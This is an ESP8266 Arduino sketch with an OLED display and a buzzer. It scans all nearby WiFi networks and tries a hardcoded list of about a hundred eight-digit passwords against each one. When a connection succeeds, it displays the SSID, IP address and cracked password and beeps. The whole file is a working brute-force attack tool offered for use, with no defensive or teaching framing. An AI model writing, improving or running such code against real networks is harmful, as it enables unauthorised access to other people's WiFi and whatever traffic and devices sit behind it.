//  CODE WITH MD.NAHIDUL ISLAM
#include <ESP8266WiFi.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1

#define BUZZER_PIN 14 

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

const char* passwords[] = {
  "01010101", "02020202", "87654321", "04040404", "05050505",
  "06060606", "08080808", "13131313", "14141414", "15151515",
  "16161616", "18181818", "12344321", "32112321", "45665456",
  "65445654", "78998789", "98778987", "11235813", "99887766",
  "12341234", "43214321", "56785678", "87658765", "98769876",
  "11112222", "22223333", "33334444", "44445555", "55556666",
  "66667777", "77778888", "88889999", "99990000", "00001111",
  "12112112", "21221221", "34343434", "45454545", "56565656",
  "67676767", "78787878", "89898989", "90909090", "91919191",
  "92929292", "93939393", "94949494", "95959595", "96969696",
  "97979797", "98989898", "99999900", "00000099", "11119999",
  "99991111", "55551111", "66664444", "77773333", "88882222",
  "12345600", "65432100", "43215678", "87654321", "10293847",
  "01928374", "01020304", "04030201", "20212223", "23222120",
  "31415927", "27182818", "12309876", "87650987", "13579246",
  "24681357", "10293856", "01928365", "00112233", "22334455",
  "44556677", "66778899", "99112233", "33221199", "44332211",
  "55443322", "66554433", "77665544", "88776655", "99887766",
  "24682468", "13579135", "19876543", "11221122", "77889900",
  "00998877", "55664433", "44335566", "12332100", "11112345"
};

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);

  pinMode(BUZZER_PIN, OUTPUT);
  digitalWrite(BUZZER_PIN, LOW); 

  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setTextSize(1);

  display.setCursor(0, 0);
  display.println(" Scanning...");
  display.display();

  int n = WiFi.scanNetworks();
  if (n == 0) {
    Serial.println("No networks found");
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("No WiFi found.");
    display.display();
    return;
  }

  for (int i = 0; i < n; i++) {
    String ssid = WiFi.SSID(i);
    Serial.print("🔍 Trying SSID: ");
    Serial.println(ssid);
    display.clearDisplay();
    display.setCursor(0, 0);
    display.print("SSID: ");
    display.println(ssid);
    display.display();

    for (int j = 0; j < sizeof(passwords) / sizeof(passwords[0]); j++) {
      WiFi.begin(ssid.c_str(), passwords[j]);

      display.setCursor(0, 20);
      display.print("Try pass: ");
      display.println(passwords[j]);
      display.display();

      Serial.print("  🔑 Trying pass: ");
      Serial.println(passwords[j]);

      int wait_time = 0;
      while (WiFi.status() != WL_CONNECTED && wait_time < 10) {
        delay(500);
        Serial.print(".");
        wait_time++;
      }

      if (WiFi.status() == WL_CONNECTED) {
        Serial.println("\nWELCOME Connected!");
        Serial.print("IP: ");
        Serial.println(WiFi.localIP());

        display.clearDisplay();
        display.setCursor(0, 0);
        display.println(" WELCOME WIFI CUNNECTED ! ");
        display.print("SSID: ");
        display.println(ssid);
        display.print("IP: ");
        display.println(WiFi.localIP());
        display.print("PASS: ");
        display.println(passwords[j]);  
        display.display();

        // বীপ বাজানো শুরু - 0.5 সেকেন্ড
        digitalWrite(BUZZER_PIN, HIGH);
        delay(500);
        digitalWrite(BUZZER_PIN, LOW);

        return;
      }

      WiFi.disconnect();
    }
  }

  Serial.println(" Couldn't connect to any WiFi.");
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println(" No WiFi login");
  display.display();
}

void loop() {
  // Future use
}
